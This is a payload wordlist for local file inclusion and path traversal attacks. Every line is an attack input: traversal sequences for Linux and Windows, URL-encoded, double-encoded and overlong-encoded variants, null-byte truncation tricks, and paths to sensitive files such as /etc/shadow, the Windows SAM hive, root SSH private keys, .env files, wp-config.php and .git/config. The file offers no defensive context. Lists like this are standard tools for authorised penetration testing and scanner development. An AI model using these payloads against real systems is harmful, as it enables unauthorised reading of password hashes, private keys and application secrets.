# Local File Inclusion / Path Traversal Payloads
# Target: read sensitive files via directory traversal

# === Basic Path Traversal ===
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../etc/resolv.conf

# === Windows Path Traversal ===
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\..\windows\win.ini
..\..\..\..\boot.ini
..\..\..\..\..\windows\system32\config\sam
..\..\..\..\windows\system.ini

# === URL Encoded ===
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd

# === Double Encoding ===
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd
..%255c..%255c..%255cetc/passwd

# === Null Byte Injection ===
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
../../../etc/passwd\0
../../../etc/passwd\0.png

# === Sensitive Files (Linux) ===
/etc/passwd
/etc/shadow
/etc/group
/etc/motd
/etc/issue
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/proc/cpuinfo
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
/var/log/nginx/access.log
/home/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.bash_history

# === Sensitive Files (Web App) ===
../../../.env
../../../config.yml
../../../config/database.yml
../../../wp-config.php
../../../.git/config
../../../.git/HEAD
../../../.gitignore
../../../.htaccess
../../../web.config
